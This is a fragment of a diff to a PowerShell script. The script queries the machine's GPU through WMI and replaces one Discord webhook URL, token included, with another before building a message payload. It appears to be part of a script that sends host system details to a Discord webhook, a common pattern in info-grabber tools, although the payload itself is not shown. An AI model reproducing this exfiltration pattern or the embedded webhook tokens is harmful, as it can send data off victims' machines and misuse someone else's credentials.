@@ -36,7 +36,7 @@ $gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name
 sleep 2
 
 # Define the Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1276573114372722698/OlouR_Ut3RBMVwFU6PVT4EpTf5E0r5pceFBPiHsdhc_PGLOKcEC_RAYqm5uc4XHGY-r2"
+$webhookUrl = "https://discord.com/api/webhooks/1276726460446675034/lE39F2Ri_OmUW0wl0wJNDaCDxBRkSilFpeJpWGo-9bhf8o-5xXVKOKzbEYRaYr0WpQTN"
 
 # Define the message payload
 $payload = @{
